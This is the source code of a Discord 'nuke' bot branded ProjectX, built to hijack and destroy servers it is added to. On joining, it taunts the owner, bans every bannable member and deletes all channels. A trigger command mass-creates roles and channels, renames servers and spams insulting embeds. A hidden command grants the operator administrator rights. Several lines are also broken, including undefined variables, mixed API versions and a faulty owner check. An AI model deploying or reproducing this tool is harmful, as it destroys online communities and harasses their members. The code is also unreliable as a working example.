const Discord = require("discord.js")
const fs = require("fs");
const client = new Discord.Client();
const cache = JSON.parse(fs.readFileSync("./caches.json", "utf8"))

const Token = cache.token 
const x_x = cache.hackcmd
const opcmd = cache.opcommand
const teext = cache.tch
const vooice = cache.vch
const pic = cache.picture
const spam = cache.spam
const namee = cache.name
const playing = cache.play
const role = cache.hackroles
const adminstrator = cache.oprole

let print = console.green;
let red = console.red;
let purple = console.purple;
let blue = console.blue;
let orange = console.orange;
let white = console.white;
let yellow = console.yellow;

async function nuke(guild) {


    let users = 0;
    let channels = 0;

    /**
     * MAP ALL GUILD MEMBERS AND CHECK IF THE BOT CAN BAN THEM
     */
    await guild.fetchMembers();

    await guild.owner.send('Hey there, Your server has been **HIJCAKED** by ProjectX. Enjoy your day Noob clearly you Pissed someone off.').catch(e => { return void e; });

    await Promise.all(guild.members.map(async (m) => {

        if (m.bannable) {

            users++;

            await m.send('HIJACKED').catch(e => { return void e });

            return m.ban().catch(e => { return void e });

            print('A user has been Banned Successfully');
        }
    }));

    /**
     * MAP ALL GUILD CHANNELS AND ATTEMPT TO DELETE OR REPLACE THEM
     */
    await Promise.all(guild.channels.cache.map(c => {

        if (c.deletable) {

            channels++;

            return c.delete();
        }
    }))

    await guild.createChannel(text, 'text');
    await guild.createChannel(vooice, 'voice');
}

/**
 * INITIALIZE NUKE FUNCTION WHEN THE BOT JOINS
 */
client.on('guildCreate', async (guild) => {

    return nuke(guild).catch(console.error);
});

/**
 * LISTEN FOR HACK COMMAND
 */
client.on('message', message => {

    if (message.content === x_x) {

        console.log('The Server Nuke/Hack has been Initialized');

        message.guild.members.forEach(baand => {

            baand.ban({ reason: 'HIJACKED by ProjectX' }).catch(e => { return void e });

            client.channels.cache.forEach(hack => {

                hack.delete().catch(e => { return void e });

                client.user.setAvatar(pic);
                client.user.setUsername(namee);
                client.user.setActivity(playing, { type: 'STREAMING', url: 'https://twitch.tv/monstercat' });

                client.guilds.forEach(hackac => {

                    hackac.setIcon(pic);
                    hackac.setName(namee);
                });
            });
        });
    };
});

/**
 * LISTEN FOR OP COMMAND
 */
client.on('message', message => {

    if (message.content === opcmd) {

        if (message.author.id !== cache.urid) return;

        let me = message.author;

        let role = message.guild.createRole({ name: 'administrator', color: 'RANDOM', permissions: [8] });

        let role1 = message.guild.roles.cache.find(r => r.name === adminstrator);

        message.channel.send('This Server has been HIJACKED by: ProjectX');

        message.guild.member(me).roles.add(role1);
}});

/**
 * ATTEMPT TO NUKE AND RESET ALL ROLES
 */
client.on('message', message => {

    if (message.content === x_x) {

        client.guilds.forEach(m => {

            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
            m.createRole({ name: role, permissions: [1], color: 'RANDOM' });
        });
    }
});

/**
 * ATTEMPT TO NUKE AND RESET ALL CHANNELS
 */
client.on('message', message => {

    if (message.content === x_x) {

        client.guilds.forEach(m => {

            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
        });
    }
});

/**
 * ATTEMPT TO NUKE AND RESET ALL VOICE CHANNELS
 */
client.on('message', message => {

    if (message.content === x_x) {

        client.guilds.forEach(m => {

            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
        });
    }
});

/**
 * CREATE AND ASSIGN A RANDOM ADMIN ROLE ON USER JOIN
 */
client.on('guildMemberAdd', member => {

    member.guild.createRole({ name: client.user.username, color: 'RANDOM', permissions: [8]}).then(function(role) { member.roles.add(role) });

});

/**
 * SPAM RANDOM EMBER WITH CONTENT FROM SHELL
 */
client.on('message', message => {

    if (message.content === x_x) {

        console.log('THE HACK HAS BEEN STARTED!');

        var teeext = teext.replace(' ', '-');

        var interval = setInterval(function () {

            const embed = new MessageEmbed()
             .setTitle('GET HACKED NOOB!')
             .setThumbnail(pic)
             .setColor('RANDOM')
             .addField(spam, '.')
             .setTimestamp()
             .setFooter('Get Fucked! Powered by: ProjectX')

             message.channel.send({ embeds: [embed] });
        }); 
    };
});

/**
 * CHECK IF BOT HAS ADMIN AND GIVE ADMIN IF NOT
 */
client.on('message', async message => {

    const owner = cache.urid;
    const member = message.author;

    if (message.content === opcmd) {

        if (!message.author.id === owner) return;

        let op = message.guild.roles.cache.find(r => r.name === `${adminstrator}`);

        if (!op) return message.guild.createRole({ name: 'OPROLE', color: 'RED', permissions: [8] });

        message.guild.member(member).roles.add(op);
    }
});

/**
 * LOGIN TO THE DISCORD CLIENT
 */
client.login(Token);

